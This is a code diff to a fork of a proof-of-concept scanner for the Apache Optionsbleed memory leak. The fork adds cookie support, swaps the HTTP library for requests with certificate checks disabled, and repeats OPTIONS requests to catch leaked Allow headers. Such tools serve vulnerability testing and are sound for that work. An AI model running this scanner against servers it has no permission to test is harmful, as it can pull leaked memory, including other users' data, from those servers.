@@ -3,29 +3,54 @@
 
 # Optionsbleed proof of concept test
 # by Hanno Böck
+#
+# Modified by MickCue(GitHub) | Forked - Added cookie support and changed to use requests
 
 import argparse
-import urllib3
 import re
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import os
+
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+session = ""
 
 
 def test_bleed(url, args):
-    r = pool.request('OPTIONS', url)
-    try:
-        allow = str(r.headers["Allow"])
-    except KeyError:
-        return False
-    if allow in dup:
-        return
-    dup.append(allow)
+
+    if args.cookie:
+        session = args.cookie
+
+        r = requests.options(url , cookies={''+session.split('=')[0]+'':''+session.split('=')[1]+''}, verify=False)
+    else:
+        r = requests.options(url , verify=False)
+
+
+    raw_headers = r.headers
+    allow= ""
+
+
+    for a in raw_headers:
+
+        if "Allow" in a:
+            allow = r.headers['allow']
+
+
     if allow == "":
         print("[empty] %s" % (url))
     elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
+        
         z = [x.strip() for x in allow.split(',')]
         if len(z) > len(set(z)):
             print("[duplicates] %s: %s" % (url, repr(allow)))
         elif args.all:
             print("[ok] %s: %s" % (url, repr(allow)))
+        #else:
+            #print("[No Issues]")
+
     elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
         print("[spaces] %s: %s" % (url, repr(allow)))
     else:
@@ -53,20 +78,33 @@ parser.add_argument("-a", "--all", action="store_true",
                     help="show headers from hosts without problems")
 parser.add_argument("-u", "--url", action='store_true',
                     help="pass URL instead of hostname")
+parser.add_argument("-c", "--cookie", help="Add Cookie")
 args = parser.parse_args()
 howoften = int(args.n[0])
+
 
 dup = []
 
 # Note: This disables warnings about the lack of certificate verification.
 # Usually this is a bad idea, but for this tool we want to find vulnerabilities
 # even if they are shipped with invalid certificates.
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-pool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')
+#pool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')
 
 if args.url:
-    test_bleed(args.hosttocheck, args)
+    #print(args.cookie)
+    #print("How Often:"+str(howoften))
+    if howoften is 10:
+        howoften = 40
+    for i in range(howoften):
+            try:
+                if test_bleed(args.hosttocheck, args) is False:
+                    break
+            except Exception as e:
+                pass
+
+
 else:
     for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:
         for i in range(howoften):
